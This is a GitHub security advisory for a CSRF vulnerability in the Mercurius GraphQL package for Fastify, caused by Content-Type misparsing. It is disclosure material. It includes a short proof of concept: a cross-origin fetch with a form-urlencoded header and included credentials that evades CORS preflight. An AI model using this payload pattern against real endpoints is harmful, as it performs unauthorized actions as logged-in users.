# [M] Mercurius: Incorrect Content-Type parsing can lead to CSRF attack

## Summary
Severity: Medium
Advisory: GHSA-v66j-6wwf-jc57
CVE: CVE-2025-64166
CWE: CWE-352
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-v66j-6wwf-jc57
Type: github-advisory

## Affected
- npm: `mercurius` — affected >=0 <16.4.0

## Details
### Summary

A Cross-Site Request Forgery (CSRF) vulnerability was identified in Mercurius versions 16. The issue arises from incorrect parsing of the `Content-Type` header in requests. Specifically, requests with `Content-Type` values such as `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` could be misinterpreted as `application/json`. This misinterpretation bypasses the preflight checks performed by the `fetch()` API, potentially allowing unauthorized actions to be performed on behalf of an authenticated user.

---

### Impact

An attacker could exploit this vulnerability by crafting a malicious request with a `Content-Type` that Fastify incorrectly parses as `application/json`. When such a request is made from a different origin, it bypasses the Cross-Origin Resource Sharing (CORS) protections, leading to a potential CSRF attack. This could result in unauthorized actions being performed on behalf of an authenticated user without their consent.

---

### Proof of Concept

```javascript
// Server-side Fastify setup
const Fastify = require('fastify');
const mercurius = require('mercurius');

const app = Fastify();
const schema = `
  type Query {
    hello(name: String): String
  }
`;

const resolvers = {
  Query: {
    hello: (_, { name }) => `Hello ${name || 'World'}!`
  }
};

app.register(mercurius, { schema, resolvers });

app.listen(3000, () => {
  console.log('Server listening on http://localhost:3000');
});
```

```javascript
// Malicious client-side code
fetch('http://localhost:3000/graphql', {
  method: 'POST',
  body: JSON.stringify({ query: '{ hello(name: "attacker") }' }),
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  credentials: 'include'
});
```

In the above example, the malicious request is crafted to exploit the CSRF vulnerability by using a `Content-Type` that Fastify incorrectly parses as `application/json`.

---

### Mitigation

To address this vulnerability, CSRF protection has been implemented.

## References

* https://github.com/mercurius-js/mercurius/pull/1187

## References
- https://github.com/mercurius-js/mercurius/security/advisories/GHSA-v66j-6wwf-jc57
- https://nvd.nist.gov/vuln/detail/CVE-2025-64166
- https://github.com/mercurius-js/mercurius/pull/1187
- https://github.com/mercurius-js/mercurius/commit/962d402ec7a92342f4a1b7f5f04af01776838c3c
- https://github.com/mercurius-js/mercurius
